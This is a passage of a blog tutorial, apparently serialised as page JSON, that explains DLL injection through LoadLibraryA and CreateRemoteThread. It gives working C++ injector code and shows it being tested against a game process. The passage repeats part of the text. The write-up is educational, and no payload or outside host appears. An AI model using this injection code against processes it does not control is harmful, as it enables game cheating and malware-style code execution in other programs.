\tGetModuleHandle(\"kernel32.dll\"),\n    \t\"LoadLibraryA\"\n    );\n    \n    if (load_library_addr == NULL) {\n    \tstd::cerr << \"GetProcAddress failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"LoadLibraryA address: \" << &load_library_addr << std::endl;\n\n6. Create a remote thread via [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread) and pass the handle we have on the remote process, the address to LoadLibraryA, and the memory address that our DLL path resides at. LoadLibraryA will be invoked and passed `dll_path_in_remote_mem_addr` by our call to CreateRemoteThread. This is where the magic happens and our DLL is loaded into the process.\n\n\n    // Create our remote thread for running our DLL code.\n    HANDLE remote_thread = CreateRemoteThread(\n    \ttarget_process,\n    \tNULL,\n    \tNULL,\n    \t(LPTHREAD_START_ROUTINE)load_library_addr,\n    \tdll_path_in_remote_mem_addr,\n    \tNULL,\n    \tNULL\n    );\n    \n    if (remote_thread == NULL) {\n    \tstd::cerr << \"CreateRemoteThread failed...\" << std::endl;\n    \treturn 1;\n    }\n    \n    std::cout << \"Remote thread address: \" << &remote_thread << std::endl;\n\n7. The last thing we do is deallocate the memory that was reserved for our DLL path using [VirtualFreeEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualfreeex) and then close our open handles using [CloseHandle](https://docs.microsoft.com/en-us/windows/desktop/api/handleapi/nf-handleapi-closehandle).\n\n\n    // Release the allocated memory we acquired from the remote process.\n    if (VirtualFreeEx(target_process, dll_path_in_remote_mem_addr, 0, MEM_RELEASE) == 0) {\n    \tstd::cerr << \"VirtualFreeEx failed on target process...\" << std::endl;\n    }\n    \n    // Free our handle on the remote thread\n    CloseHandle(remote_thread);\n    \n    // Free our handle on the remote process\n    CloseHandle(target_process);\n\nTying our code together and testing it out ~ we run `.\\InjectDLL.exe`, then enter the remote target PID, and finally the absolute path to `TestDLL.dll`. Our executable outputs some information about the injection indicating it was successful.  \n\n![](2019/07/2019-05-02-090559_3440x1440_scrot.png \"Successful execution of our DLL injector\")\n\nOur injector indicated it was successful, but we can double check with Window's [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer). After installing it (if you don't have it installed already) we launch it, make sure the lower pane is visible by toggling it on. This can be achieved by checking the `View -> Show Lower Pane` option. Then, select the remote target process in the list and press the key combination `Ctrl + d`. You should now see a list of loaded DLLs. One of which is our DLL! \n\n![](2019/07/process-explorer-test-dll-injection-success.png \"Using Process Explorer, we can see that our TestDLL.dll file was injected into Game.exe successfully.\")\n\nOnce we have successfully loaded our DLL into the target process, we can access and reference anything within it's virtual memory space. In part 2, I'll demonstrate an example use case of DLL injection by showing how we can find an in-memory data structure (i.e. the offset to a player structure / class in a game).\n\nThe full source code for both the DLL injector and the Test DLL can be found in this [Github](https://github.com/selftaught/DLLinjector) repository.\n\nThanks for reading through this article! If you notice any issues in the write-up or code - please don't hesitate to message me! You can do so via [keybase](https://keybase.io/th3v0id) or [twitter](https://twitter.com/x74x76).\n","cover":"2019/07/process-explorer-test-dll-injection-success.png","author":{"name":"th3v0id","avatar":"avatars/th3v0id.jpg"},"content":"\n[DLL injection](https://en.wikipedia.org/wiki/DLL_injection) is the process of forcing a running process to load a DLL (Dynamically Linked Library) of your choice. In this write-up, I'll walk you through the LoadLibraryA injection method. This causes the DLL to be loaded into the context of the process thus allowing us to execute our own code inside of the process's virtual memory space.\n\n\tI assume there is a base understanding of what a DLL is. By the end of this write-up, we'll have a functional DLL injector along with a bare-bone test DLL which we'll use for testing during development.\n\n\tWriting a DLL injector is pretty trivial and only requires a handful steps. Remember that DLLs are specific to Windows and there-for we'll be utilizing functions provided to us by the Windows API. The steps required for the task at hand are in order as follows:\n\n1. Acquire a handle to the remote process that you want to inject / load your DLL into. We do this by prompting for a process ID (PID) after displaying a list of processes w/ their PIDs.\n\n\n    // Get the remote target pid\n    uint16_t target_pid = get_target_pid();\n    \n    if (!target_pid) {\n    std::cerr << \"Getting remote target process ID failed...\" << std::endl;\n    return 1;\n    }\n    \n    // <snipped> ...\n    \n    // Obtain a handle to the target remote process.\n    HANDLE target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);\n    \n    \n    if (target_process == NULL) {\n        std::cerr << \"Acquiring a handle to the remote target process failed...\" << std::endl;\n        return -1;\n    }\n\n*get_target_pid() function:*\n\n    \n    uint16_t get_target_pid() {\n    \tuint16_t pid = 0;\n    \t\n    \tstd::string pid_str;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"The given process ID is invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tprint_process_list();\n    \n    \t\tstd::cout << \"\\nEnter target process ID: \";\n    \t\tstd::getline(std::cin, pid_str);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (pid_str == \"exit\" ||\n    \t\t\tpid_str == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(pid_str) == false && !pid_str.size());\n    \n    \tif (pid_str != \"exit\" &&\n    \t\tpid_str != \"quit\") {\n    \t\tpid = (uint16_t)std::stoi(pid_str);\n    \t}\n    \n    \treturn pid;\n    }\n\n2. Create and store the DLL's absolute path in a variable.\n\n\n    // Get the dll's path that we want to inject into our remote target process.\n    std::string dll_path = get_dll_path();\n    \n    std::cout << \"DLL path: \" << dll_path << std::endl;\n\n*get_dll_path() function:*\n\n    std::string get_dll_path() {\n    \n    \tstd::string dll_path;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"Specified DLL path was invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tstd::cout << \"Enter path to DLL: \";\n    \t\tstd::getline(std::cin, dll_path);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (dll_path == \"exit\" ||\n    \t\t\tdll_path == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(dll_path) == false);\n    \n    \treturn dll_path;\n    }\n\n3. Now we need to allocate enough space in the remote process to store the DLLs absolute path. We achieve this by using Window's [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex) function.\n\n\n    // Allocate space for our DLL path inside the target remote process.\n    LPVOID dll_path_in_remote_mem_addr = VirtualAllocEx(\n    \ttarget_process,\n    \tNULL,\n    \t_MAX_PATH,\n    \tMEM_RESERVE | MEM_COMMIT,\n    \tPAGE_EXECUTE_READWRITE\n    );\n    \n    if (dll_path_in_remote_mem_addr == NULL) {\n    \tstd::cerr << \"Allocating space for our DLL path in the remote target process's virtual memory space failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"DLL allocation memory address: \" << &dll_path_in_remote_mem_addr << std::endl;\n\n4. And now that we've allocated and reserved enough memory for the DLL path, we can write it into that region of memory of the remote process using the Window's [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory) function. \n\n\n    // Copy the DLL path into the allocated memory region.\n    bool write_status = WriteProcessMemory(\n    \ttarget_process,\n    \tdll_path_in_remote_mem_addr,\n    \tdll_path.c_str(),\n    \tstrlen(dll_path.c_str()),\n    \tNULL\n    );\n    \n    std::cout << \"WriteProcessMemory was \" << (write_status ? \"successful!\" : \"unsuccessful...\") << std::endl;;\n    \n    if (!write_status) {\n    \tstd::cerr << \"GetLastError() for failed WriteProcessMemory() call: \" << GetLastError() << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n\n5. Next, we'll need to obtain the address to the Window's [LoadLibraryA](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibrarya) function. This is easily done through the Window's [GetProcAddress](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getprocaddress) function.\n\n\n    // Get the address to the LoadLibraryA Windows API function.\n    LPVOID load_library_addr = (LPVOID)GetProcAddress(\n    \tGetModuleHandle(\"kernel32.dll\"),\n    \t\"LoadLibraryA\"\n    );\n    \n    if (load_library_addr == NULL) {\n    \tstd::cerr << \"GetProcAddress failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"LoadLibraryA address: \" << &load_library_addr << std::endl;\n\n6. Create a remote thread via [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread) and pass the handle we have on the remote process, the address to LoadLibraryA, and the memory address that our DLL path resides at. LoadLibraryA will be invoked and passed `dll_path_in_remote_mem_addr` by our call to CreateRemoteThread. This is where the magic happens and our DLL is loaded into the process.\n\n\n    // Create our remote thread for running our DLL code.\n    HANDLE remote_thread = CreateRemoteThread(\n    \ttarget_process,\n    \tNULL,\n    \tNULL,\n    \t(LPTHREAD_START_ROUTINE)load_library_addr,\n    \tdll_path_in_remote_mem_addr,\n    \tNULL,\n    \tNULL\n    );\n    \n    if (remote_thread == NULL) {\n    \tstd::cerr << \"CreateRemoteThread failed...\" << std::endl;\n    \treturn 1;\n    }\n    \n    std::cout << \"Remote thread address: \" << &remote_thread << std::endl;\n\n7. The last thing we do is deallocate the memory that was reserved for our DLL path using [VirtualFreeEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualfreeex) and then close our open handles using [CloseHandle](https://docs.microsoft.com/en-us/windows/desktop/api/handleapi/nf-handleapi-closehandle).\n\n\n    // Release the allocated memory we acquired from the remote process.\n    if (VirtualFreeEx(target_process, dll_path_in_remote_mem_addr, 0, MEM_RELEASE) == 0) {\n    \tstd::cerr << \"VirtualFreeEx failed on target process...\" << std::endl;\n    }\n    \n    // Free our handle on the remote thread\n    CloseHandle(remote_thread);\n    \n    // Free our handle on the remote process\n    CloseHandle(target_process);\n\nTying our code together and testing it out ~ we run `.\\InjectDLL.exe`, then enter the remote target PID, and finally the absolute path to `TestDLL.dll`. Our executable outputs some information about the injection indicating it was successful.  \n\n![](2019/07/2019-05-02-090559_3440x1440_scrot.png \"Successful execution of our DLL injector\")\n\nOur injector indicated it was successful, but we can double check with Window's [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer). After installing it (if you don't have it installed already) we launch it, make sure the lower pane is visible by toggling it on. This can be achieved by checking the `View -> Show Lower Pane` option. Then, select the remote target process in the list and press the key combination `Ctrl + d`. You should now see a list of loaded DLLs. One of which is our DLL! \n\n![](2019/07/process-explorer-test-dll-injection-success.png \"Using Process Explorer, we can see that our TestDLL.dll file was injected into Game.exe successfully.\")\n\nOnce we have successfully loaded our DLL into the target process, we can access and reference anything within it's virtual memory space. In part 2, I'll demonstrate an example use case of DLL injection by showing how we can find an in-memory data structure (i.e. the offset to a player structure / class in a game).\n\nThe full source code for both the DLL injector and the Test DLL can be found in this [Github](https://github.com/selftaught/DLLinjector) repository.\n\nThanks for reading through this article! If you notice any issues in the write-up or code - please don't hesitate to message me! You can do so via [keybase](https://keybase.io/th3v0id) or [twitter](https://twitter.com/x74x76).\n"}]},"__N_SSG":true}